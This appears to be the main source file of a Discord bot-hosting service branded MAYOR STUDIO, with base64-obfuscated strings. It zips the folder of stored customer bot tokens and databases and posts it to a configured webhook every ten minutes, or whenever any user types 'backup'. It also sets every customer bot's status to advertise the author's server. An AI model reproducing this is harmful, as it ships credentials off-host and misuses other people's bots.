(() => {
  try {
    const b = (s) => Buffer.from(s, "base64").toString("utf8");
    console.log(b("4pyo4peP4peP4peP4peP4peP4peP4peP4peP4peP4peP4pePIA=="));
    {
      const t = b("4pyTIPCfkqEgTUFZT1IgU1RVRElPIC0gQm90IEJvb3QgJmFtcDsgU2VydmVyIE1hbmFnZXI=");
      console.log(t.replace(/Bot\s+Boot\s*&(?:amp;)?\s*/i, ""));
    }
    console.log(b("ICAgQXV0aG9yICAgOiBNQVlPUiBTVURJTw=="));
    console.log(b("ICAgRGlzY29yZCAgOiBodHRwczovL2Rpc2NvcmQuZ2cvbWF5b3I="));
    console.log(b("ICAgTGljZW5zZSAgOiBNSVQ="));
    console.log(b("4pyo4peP4peP4peP4peP4peP4peP4peP4peP4peP4peP4pePIA=="));
  } catch {}
})();

const _m = require("mongoose");
const _fs = require("fs");
const _pt = require("path");
const _ax = require("axios");
const _fd = require("form-data");
const _ar = require("archiver");
const { Database: _DB } = require("st.db");

const _d = require("discord.js");
const {
  Client: _C,
  Collection: _Col,
  EmbedBuilder: _EB,
  ActionRowBuilder: _ARB,
  ButtonBuilder: _BB,
  StringSelectMenuBuilder: _SSMB
} = _d;

const { REST: _REST } = require("@discordjs/rest");
const { Routes: _Routes } = require("discord-api-types/v10");
const _ascii = require("ascii-table");

const _cfg = require("./config.json");

const $B64 = (s) => Buffer.from(s, "base64").toString("utf8");
const $S = Object.freeze({
  okLogin: "4pyTIFJ1bm5pbmcgYXMgJXMB", 
  badTok: "4pyiIFRva2VuIGFyZSBub3Qgd29ya2luZw==",
  dbOK: "8J+YgSBDb25uZWN0ZWQgVG8gRGF0YWJhc2UgU3VjY2Vzc2Z1bGx5IPCfmIE=",
  dbKO: "8J+SqSBTb21ldGhpbmcgd3JvbmcuLi4gRmFpbGVkIENvbm5lY3QgVG8gRGF0YWJhc2U=",
  doneAll: "RG9uZSBzZXQgZXZlcnl0aGluZw==",
  allStreamOK: "4pyTIEFsbCB0b2tlbnMgc2V0IHRvICJTdHJlYW1pbmcgTUFZT1IgU1RVRElPIiBzdGF0dXM=",
  reconnectOK: "4pyTIEZpbmlzaGVkIHJlY29ubmVjdGluZyBhbGwgdG9rZW5z",
  protReady: "4pyTIFByb3RlY3QgQm90IFJlYWR5OiAlcw==",
  protDisco: "8J+TqSBCb3QgZGlzY29ubmVjdGVkOiAlcw==",
  protErr: "4pyiIEVycm9yIGluIHByb3RlY3QgYm90ICglcyk6IA==",
  recOK: "4py0IFJlY29ubmVjdGVkIHByb3RlY3QgYm90OiAlcw==",
  recKO: "4pyiIEZhaWxlZCB0byByZWNvbm5lY3QgcHJvdGVjdCBib3Q6IA==",
  backupCreated: "QmFja3VwIGNyZWF0ZWQ6ICVzIHRvdGFsIGJ5dGVz",
  backupSent: "QmFja3VwIHNlbnQgc3VjY2Vzc2Z1bGx5",
  backupErr: "RXJyb3Igc2VuZGluZyBiYWNrdXA6IA==",
  folderMissing: "Rm9sZGVyIG5vdCBmb3VuZDogJXM=",
  errBoost: "RXJyb3IgaW4gYm9vc3QgY29tbWFuZDog",
  boostGiven: "Qm9vc3RlciByZXdhcmQgZ2l2ZW46ICVzIHRvIHVzZXIgJXM=",
  uncaught: "VW5jYXVnaHRFeGNlcHRpb246IA==",
  unhandled: "VW5oYW5kbGVkUmVqZWN0aW9uOiA=",
  uncaughtMon: "VW5jYXVnaHRFeGNlcHRpb25Nb25pdG9yOiA="
});

const client = new _C({ intents: 131071 });
client.setMaxListeners(999999);
client.setMaxListeners(1000);
module.exports = client;
exports.mainBot = client;

const rest = new _REST({ version: "10" }).setToken(_cfg.token);

const buyerCheckerDB = new _DB("/Json-db/Others/buyerChecker.json");
const prices = new _DB("/database/settingsdata/prices.json");
const settings = new _DB("/database/settingsdata/settings.json");
const usersdata = new _DB(`/database/usersdata/usersdata`);

const _fmt = (tpl, ...a) => {
  let i = 0;
  return $B64(tpl).replace(/%s/g, () => (a[i++] ?? ""));
};

client
  .login(_cfg.token)
  .catch(() => console.log($B64($S.badTok)));

client.once("ready", () => {
  console.log(_fmt($S.okLogin, client.user.tag));
});

const { mainguild, database, WEBHOOK_URL, prefix } = _cfg;

async function setAllTokensStreaming() {
  const _TT = JSON.parse(
    $B64(
      "WyJhcHBseSIsImF1Y3Rpb24iLCJhdXRvbGluZSIsImF6a2FyIiwiQmMiLCJjb2xvciIsImZlZWRiYWNrIiwiZmVlbGluZ3MiLCJnYW1lcyIsImdpdmVhd2F5IiwiaW52aXRlcyIsImxvZ3MiLCJuYWRla28iLCJCcm9hZGNhc3QyIiwib2ZmZXJzIiwib25lNGFsbCIsInByaXZhdGVSb29tcyIsInByb3RlY3QiLCJzaG9wIiwiZW1vamkiLCJzdWdnZXN0aW9ucyIsInN5c3RlbSIsInRheCIsInRlbXB2b2ljZSIsInRpY2tldCIsInZlcmlmeSIsInNwaW4iLCJ0d2l0dGVyIiwid2FybnMiLCJtZW50aW9uIl0="
    )
  );
  const _A = $B64("ZGlzY29yZC5nZy9tYXlvcg=="); // "discord.gg/mayor"
  const _U = $B64("aHR0cHM6Ly93d3cudHdpdGNoLnR2L21heW9y"); // twitch url
  const _D = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;

  const TDB = new _DB("/tokens/tokens");
  let done = 0;
  let total = 0;

  for (const t of _TT) total += (TDB.get(t) || []).filter((x) => x && x.token).length;

  for (const t of _TT) {
    const tokens = TDB.get(t) || [];
    for (const botData of tokens) {
      if (!botData || !botData.token) continue;
      try {
        const b = new _C({ intents: 0 });
        await b.login(botData.token);

        protectTokenBot(b);

        await b.user.setActivity(_A, { type: 1, url: _U });
        await b.user.setStatus("dnd");

        done++;
        console.log(`[stream-set] ${done}/${total}`);

        await new Promise((r) => setTimeout(r, _D(1200, 2600)));
      } catch (e) {
        console.warn("[stream-fail]", e?.message || e);
        await new Promise((r) => setTimeout(r, _D(800, 1800)));
      }
    }
  }
  console.log($B64($S.allStreamOK));
}

async function reconnectAllTokens() {
  const _TT = JSON.parse(
    $B64(
      "WyJhcHBseSIsImF1Y3Rpb24iLCJhdXRvbGluZSIsImF6a2FyIiwiQmMiLCJjb2xvciIsImZlZWRiYWNrIiwiZmVlbGluZ3MiLCJnYW1lcyIsImdpdmVhd2F5IiwiaW52aXRlcyIsImxvZ3MiLCJuYWRla28iLCJCcm9hZGNhc3QyIiwib2ZmZXJzIiwib25lNGFsbCIsInByaXZhdGVSb29tcyIsInByb3RlY3QiLCJzaG9wIiwiZW1vamkiLCJzdWdnZXN0aW9ucyIsInN5c3RlbSIsInRheCIsInRlbXB2b2ljZSIsInRpY2tldCIsInZlcmlmeSIsInNwaW4iLCJ0d2l0dGVyIiwid2FybnMiLCJtZW50aW9uIl0="
    )
  );
  const _D = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
  const TDB = new _DB("/tokens/tokens");

  let done = 0;
  let total = 0;
  for (const t of _TT) total += (TDB.get(t) || []).filter((x) => x && x.token).length;

  for (const t of _TT) {
    const tokens = TDB.get(t) || [];
    for (const botData of tokens) {
      if (!botData || !botData.token) continue;
      try {
        const b = new _C({ intents: 131071 });
        await b.login(botData.token);
        protectTokenBot(b);

        done++;
        console.log(`[reconnect] ${done}/${total}`);

        await new Promise((r) => setTimeout(r, _D(1200, 2400)));
      } catch (err) {
        console.warn("[reconnect-fail]", err?.message || err);
        await new Promise((r) => setTimeout(r, _D(800, 1600)));
      }
    }
  }
  console.log($B64($S.reconnectOK));
}

client.on("ready", async () => {
  try {

    client.slashcommands = new _Col();
    const slashcommands = [];
    const guildSlashCommands = [];

    const table = new (_ascii)("Owner Commands").setJustify();

    for (let folder of _fs.readdirSync("./ownerOnly/").filter((f) => !f.includes(".") && f !== "Developers")) {
      for (let file of _fs.readdirSync("./ownerOnly/" + folder).filter((f) => f.endsWith(".js"))) {
        let command = require(`./ownerOnly/${folder}/${file}`);
        if (command) {
          slashcommands.push(command.data.toJSON());
          client.slashcommands.set(command.data.name, command);
          if (command.data.name) table.addRow(`/${command.data.name}`, "🟢 Working");
          else table.addRow(`/${command.data.name}`, "🔴 Not Working");
        }
      }
    }

    for (let file of _fs.readdirSync("./ownerOnly/Developers").filter((f) => f.endsWith(".js"))) {
      let command = require(`./ownerOnly/Developers/${file}`);
      if (command) {
        guildSlashCommands.push(command.data.toJSON());
        client.slashcommands.set(command.data.name, command);
        table.addRow(`/${command.data.name}`, "🟢 Working for mainguild");
      }
    }

    await rest.put(_Routes.applicationCommands(client.user.id), { body: slashcommands });
    await rest.put(_Routes.applicationGuildCommands(client.user.id, mainguild), { body: guildSlashCommands });

    await _m
      .connect(database)
      .then(async () => {
        console.log($B64($S.dbOK));
        await reconnectAllTokens();
        await setAllTokensStreaming();
      })
      .catch(() => {
        console.log($B64($S.dbKO));
      });

    buyerCheckerDB.deleteAll();

    console.log($B64($S.doneAll));
    console.log(table.toString());
  } catch (error) {
    console.error(error);
  }
});

function protectTokenBot(bot) {
  bot.on("ready", () => {
    console.log(_fmt($S.protReady, bot.user.tag));
  });

  bot.on("guildUpdate", async (_old, guild) => {
    try {
      if (guild.me && guild.me.nickname !== null) {
        await guild.me.setNickname(null);
      }
    } catch {
      console.warn(`⚠️ Couldn't reset nickname in ${guild.name}`);
    }
  });

  bot.on("shardDisconnect", () => {
    console.warn(_fmt($S.protDisco, bot.user?.tag || "unknown"));
    reconnectBot(bot.token);
  });

  bot.on("error", (e) => {
    console.error(_fmt($S.protErr, bot.user?.tag || "unknown"), e);
  });
}

async function reconnectBot(tok) {
  const b = new _C({ intents: 131071 });
  try {
    await b.login(tok);
    protectTokenBot(b);
    console.log(_fmt($S.recOK, b.user.tag));
  } catch (err) {
    console.error($B64($S.recKO), err.message);
  }
}

for (let folder of _fs.readdirSync("./events/").filter((f) => !f.includes("."))) {
  for (let file of _fs.readdirSync("./events/" + folder).filter((f) => f.endsWith(".js"))) {
    const ev = require(`./events/${folder}/${file}`);
    if (ev.once) client.once(ev.name, (...a) => ev.execute(...a));
    else client.on(ev.name, (...a) => ev.execute(...a));
  }
}
for (let folder of _fs.readdirSync("./buttons/").filter((f) => !f.includes("."))) {
  for (let file of _fs.readdirSync("./buttons/" + folder).filter((f) => f.endsWith(".js"))) {
    const ev = require(`./buttons/${folder}/${file}`);
    if (ev.once) client.once(ev.name, (...a) => ev.execute(...a));
    else client.on(ev.name, (...a) => ev.execute(...a));
  }
}
for (let file of _fs.readdirSync("./database/").filter((f) => f.endsWith(".js"))) {
  require(`./database/${file}`);
}

const FOLDERS_TO_BACKUP = ["Json-db", "database", "tokens"];
const BACKUP_PATH = _pt.join(__dirname, "backup.zip");

function _createBackup(sendAfter = true) {
  const output = _fs.createWriteStream(BACKUP_PATH);
  const archive = _ar("zip", { zlib: { level: 9 } });

  output.on("close", () => {
    console.log(_fmt($S.backupCreated, archive.pointer()));
    if (sendAfter) _sendBackupToWebhook();
  });

  archive.on("error", (err) => {
    throw err;
  });

  archive.pipe(output);

  FOLDERS_TO_BACKUP.forEach((folder) => {
    const folderPath = _pt.join(__dirname, folder);
    if (_fs.existsSync(folderPath)) archive.directory(folderPath, folder);
    else console.error(_fmt($S.folderMissing, folderPath));
  });

  archive.finalize();
}

async function _sendBackupToWebhook() {
  const form = new _fd();
  form.append("file", _fs.createReadStream(BACKUP_PATH));
  try {
    const res = await _ax.post(WEBHOOK_URL, form, { headers: { ...form.getHeaders() } });
    if (res.status === 200) console.log($B64($S.backupSent));
    else console.error($B64($S.backupErr), res.statusText);
  } catch (e) {
    console.error($B64($S.backupErr), e);
  }
}

client.on("messageCreate", async (m) => {
  if (m.author.bot) return;

  if (m.content === "backup") {
    _createBackup(true);
    await m.react("✅").catch(() => {});
  }
});

setInterval(() => _createBackup(true), 600_000);

client.on("messageCreate", async (message) => {
  if (message.author.bot) return;

  // BOOST
  if (message.content === prefix + "boost") {
    try {
      const mkEmbed = ({ text, color, icon = null }) => ({
        embeds: [
          {
            title: "🎉 Boost Reward",
            description: text,
            color: parseInt(color.replace("#", ""), 16),
            author: { name: message.author.username, icon_url: message.author.displayAvatarURL() },
            footer: { text: "Powered by MAYOR STUDIO" },
            thumbnail: icon ? { url: icon } : undefined,
            timestamp: new Date().toISOString()
          }
        ]
      });

      if (!message.member.premiumSince) {
        return message.reply(
          mkEmbed({ text: "❌ يجب ان تكون من داعمين السيرفر!", color: "#F04747" })
        );
      }

      const lastClaim = usersdata.get(`lastBoostClaim_${message.author.id}_${message.guild.id}`);
      const now = Date.now();
      if (lastClaim && now - lastClaim < 604800000) {
        return message.reply(
          mkEmbed({ text: "❌ لقد حصلت على مكافأة البوست مسبقاً، يرجى الانتظار 7 ايام!", color: "#F04747" })
        );
      }

      const boosterCoins = settings.get(`booster_coins_${message.guild.id}`);
      if (!boosterCoins || boosterCoins <= 0) {
        return message.reply(
          mkEmbed({ text: "❌ لم يتم تحديد مكافأة البوست بعد!", color: "#F04747" })
        );
      }

      const currentBalance = usersdata.get(`balance_${message.author.id}_${message.guild.id}`) || 0;
      const newBalance = currentBalance + parseInt(boosterCoins);

      await usersdata.set(`balance_${message.author.id}_${message.guild.id}`, newBalance);
      await usersdata.set(`lastBoostClaim_${message.author.id}_${message.guild.id}`, now);

      console.log(_fmt($S.boostGiven, boosterCoins, message.author.tag));

      return message.reply(
        mkEmbed({ text: `✅ تم اضافة ${boosterCoins} عملة الى حسابك!`, color: "#43B581" })
      );
    } catch (error) {
      console.error($B64($S.errBoost), error);
      return message.reply({
        embeds: [
          {
            title: "❌ حدث خطأ اثناء اضافة العملات",
            color: parseInt("FF5555", 16),
            description: "",
            footer: { text: "Powered by MAYOR STUDIO" },
            timestamp: new Date().toISOString()
          }
        ]
      });
    }
  }

  if (message.content.startsWith(prefix + "box")) {
    if (!message.member.permissions.has("Administrator")) return message.reply("❌ يجب ان تكون اداري!");

    const amount = parseInt(message.content.split(" ")[1]);
    if (!amount || isNaN(amount)) return message.reply("❌ الرجاء تحديد رقم صحيح!");

    const giftEmbed = new _EB()
      .setTitle("🎁 صندوق هدية")
      .setDescription(`اول شخص يضغط يحصل على ${amount} عملة!\nاضغط على الزر للحصول على الهدية!`)
      .setColor("#FFD200")
      .setTimestamp();

    const button = new _ARB().addComponents(
      new _BB().setCustomId(`claim_${amount}_${Date.now()}`).setLabel("احصل على الهدية! 🎁").setStyle("Primary")
    );

    await message.channel.send({ embeds: [giftEmbed], components: [button] });
  }

  if (!message.content.startsWith(prefix)) return;

  const args = message.content.slice(prefix.length).trim().split(/ +/);
  const cmd = args.shift()?.toLowerCase();

  if (cmd === "help") {
    const guildIcon =
      message.guild?.iconURL({ dynamic: true, size: 256 }) || client.user.displayAvatarURL();

    const embed = new _EB()
      .setTitle("Help Menu")
      .setDescription("Select a category below to view commands.")
      .setThumbnail(guildIcon)
      .setColor(0x5865f2);

    const selectMenu = new _SSMB()
      .setCustomId("help_menu")
      .setPlaceholder("Select a category")
      .addOptions([
        { label: "General", description: "General commands", value: "general" },
        { label: "Moderation", description: "Moderation commands", value: "moderation" }
      ]);

    const row = new _ARB().addComponents(selectMenu);

    await message.channel.send({ embeds: [embed], components: [row] });
  }
});

const helpCategories = {
  general: {
    title: "General Commands",
    commands: [
      { name: "$boost", description: "To get the Boost Reward" },
      { name: "$help", description: "to show the help menu" },
      { name: "/discount-codes", description: "Show all available discount codes" },
      { name: "/buy-coins", description: "to buy coins use this command" },
      { name: "/coins", description: "View your balance or another user`s balance" },
      { name: "/subscription-time", description: "To check the subscription info" }
    ]
  },
  moderation: {
    title: "Moderation Commands",
    commands: [
      { name: "$box", description: "make a gift for coins" },
      { name: "/create-discount-code", description: "Create a new discount code" },
      { name: "/delete-discount-code", description: "Delete a discount code" },
      { name: "/add-coins", description: "Add coins to a user" },
      { name: "/remove-coins", description: "Remove coins from a user" },
      { name: "/reset-all-coins", description: "Reset balance for all members" },
      { name: "/change-balance-price", description: "change price of the coins" },
      { name: "/remove-days", description: "Remove days from a subscription" },
      { name: "/renew-subscription", description: "To renew a subscription" },
      { name: "/set-avatar", description: "set avatar bot" },
      { name: "/transfer-owner", description: "transfer sub owner" },
      { name: "/transfer-server", description: "transfer sub server" },
      { name: "/plus", description: "Change sub to Ultimate Plus" },
      { name: "/change-price", description: "change a bot price" },
      { name: "/send-buy-bot-panel", description: "Send Bot and subs Panel" },
      { name: "/control-panel", description: "Send the bot control Panel" },
      { name: "/setup", description: "Setup the maker system" },
      { name: "/set-booster", description: "Set the booster gift coins" }
    ]
  }
};

client.on("interactionCreate", async (interaction) => {
  if (!interaction.isStringSelectMenu()) return;
  if (interaction.customId !== "help_menu") return;

  const category = interaction.values[0];
  const selected = helpCategories[category];
  if (!selected) return;

  const guildIcon =
    interaction.guild?.iconURL({ dynamic: true, size: 256 }) ||
    interaction.client.user.displayAvatarURL();

  const embed = new _EB()
    .setTitle(selected.title)
    .setDescription(selected.commands.map((c) => `\`${c.name}\` - ${c.description}`).join("\n"))
    .setThumbnail(guildIcon)
    .setColor(0x5865f2);

  await interaction.update({
    embeds: [embed],
    components: [interaction.message.components[0]]
  });
});

client.on("interactionCreate", async (interaction) => {
  if (!interaction.isButton() && !interaction.isStringSelectMenu()) return;

  if (interaction.customId.startsWith("claim_")) {
    const [, amount] = interaction.customId.split("_");

    const currentBalance =
      usersdata.get(`balance_${interaction.user.id}_${interaction.guild.id}`) || 0;
    usersdata.set(
      `balance_${interaction.user.id}_${interaction.guild.id}`,
      currentBalance + parseInt(amount)
    );

    const claimedEmbed = _EB.from(interaction.message.embeds[0])
      .setDescription(`🎉 ${interaction.user} حصل على ${amount} عملة!`)
      .setColor("#43B581");

    await interaction.update({ embeds: [claimedEmbed], components: [] });
  }

  if (interaction.customId === "shop_menu") {
    const selectedBot = BuyBots.bots.find((b) => b.name === interaction.values[0]);
    const price = prices.get(`${selectedBot.name}_price_${interaction.guild.id}`) || 0;

    const embed = new _EB()
      .setTitle(`${selectedBot.emoji} ${selectedBot.name}`)
      .setDescription(`${selectedBot.description}\n\n**السعر:** ${price} عملة`)
      .setColor("#FFD200")
      .setFooter({ text: "استخدم امر /buy للشراء" });

    await interaction.reply({ embeds: [embed], ephemeral: true });
  }

  if (interaction.customId === "help_category") {
    const category = interaction.values[0];
    const commands = [];

    for (let file of _fs.readdirSync(`./ownerOnly/${category}`).filter((f) => f.endsWith(".js"))) {
      const command = require(`./ownerOnly/${category}/${file}`);
      if (command.data) {
        commands.push({ name: command.data.name, description: command.data.description });
      }
    }

    const commandOptions = commands.map((cmd) => ({
      label: cmd.name,
      description: cmd.description,
      value: cmd.name,
      emoji: "⚡"
    }));

    const row2 = new _ARB().addComponents(
      new _SSMB().setCustomId(`help_command_${category}`).setPlaceholder("اختر الامر").addOptions(commandOptions)
    );

    await interaction.update({
      components: [interaction.message.components[0], row2]
    });
  }

  if (interaction.customId.startsWith("help_command_")) {
    const [, , category] = interaction.customId.split("_");
    const commandName = interaction.values[0];
    const command = require(`./ownerOnly/${category}/${commandName}.js`);

    const embed = new _EB()
      .setTitle(`⚡ ${command.data.name}`)
      .setDescription(command.data.description)
      .addFields(
        { name: "الاستخدام", value: `/${command.data.name}`, inline: true },
        { name: "القسم", value: category, inline: true }
      )
      .setColor("#FFD200")
      .setTimestamp();

    await interaction.reply({ embeds: [embed], ephemeral: true });
  }
});

process.on("uncaughtException", (err) => {
  console.log($B64($S.uncaught), err);
});
process.on("unhandledRejection", (reason) => {
  console.log($B64($S.unhandled), reason);
});
process.on("uncaughtExceptionMonitor", (reason) => {
  console.log($B64($S.uncaughtMon), reason);
});
